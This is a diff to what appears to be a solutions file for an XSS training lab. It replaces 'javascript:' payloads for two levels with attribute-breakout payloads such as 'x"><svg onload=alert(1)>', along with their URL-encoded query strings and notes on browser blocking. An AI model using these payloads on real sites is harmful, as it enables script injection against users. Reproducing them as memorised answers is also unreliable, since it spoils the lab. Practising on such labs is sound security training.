@@ -11,10 +11,10 @@ Reflections into URL-valued attributes (href, meta refresh, form action, object 
 
 ### redirectxss-level2
 
-`/redirectxss/level2/?query=javascript:alert(1)`
+`/redirectxss/level2/?query=x%22%3E%3Csvg%20onload=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: `<meta http-equiv="refresh" content="0;url=...">`
+- payload: `x"><svg onload=alert(1)>`
+- context: `<meta http-equiv="refresh" content="0;url=...">`; Chrome blocks javascript: refresh, so break out
 
 ### redirectxss-level3
 
@@ -39,7 +39,7 @@ Reflections into URL-valued attributes (href, meta refresh, form action, object 
 
 ### redirectxss-level6
 
-`/redirectxss/level6/?query=javascript:alert(1)`
+`/redirectxss/level6/?query=x%22%3E%3Csvg%20onload=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: `<object data="...">`
+- payload: `x"><svg onload=alert(1)>`
+- context: `<object data="...">`; Chrome blocks javascript: data, so break out
